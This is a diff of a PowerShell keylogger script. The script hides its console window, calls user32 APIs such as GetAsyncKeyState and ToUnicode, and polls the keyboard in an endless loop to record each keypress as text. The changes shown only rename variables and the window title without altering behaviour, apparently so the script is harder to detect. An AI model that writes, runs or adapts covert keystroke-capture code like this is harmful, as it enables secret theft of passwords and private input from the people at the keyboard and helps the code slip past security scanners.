@@ -11,8 +11,8 @@ if($hwnd -ne [System.IntPtr]::Zero){
     $Type::ShowWindowAsync($hwnd, 0)
 }
 else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $Host.UI.RawUI.WindowTitle = 'xxx'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
@@ -50,7 +50,7 @@ Nimble – Quick and light in movement or action.
 
 
 # Import DLL Definitions for keyboard inputs
-$API = @'
+$defs = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -60,8 +60,7 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
-
+$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
 
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
@@ -76,7 +75,7 @@ While ($true){
       Start-Sleep -Milliseconds 30
         for ($asc = 8; $asc -le 254; $asc++){
         # Get the key state. (is any key currently pressed)
-        $keyst = $API::GetAsyncKeyState($asc)
+        $keyst = $defs::GetAsyncKeyState($asc)
           # If a key is pressed
           if ($keyst -eq -32767) {
           # Restart the inactivity timer
@@ -84,13 +83,13 @@ While ($true){
           $LastKeypressTime.Restart()
           $null = [console]::CapsLock
           # Translate the keycode to a letter
-          $vtkey = $API::MapVirtualKey($asc, 3)
+          $vtkey = $defs::MapVirtualKey($asc, 3)
           # Get the keyboard state and create stringbuilder
           $kbst = New-Object Byte[] 256
-          $checkkbst = $API::GetKeyboardState($kbst)
+          $checkkbst = $defs::GetKeyboardState($kbst)
           $logchar = New-Object -TypeName System.Text.StringBuilder
             # Define the key that was pressed          
-            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+            if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
               # Check for non-character keys
               $LString = $logchar.ToString()
                 if ($asc -eq 8) {$LString = "[BKSP]"}
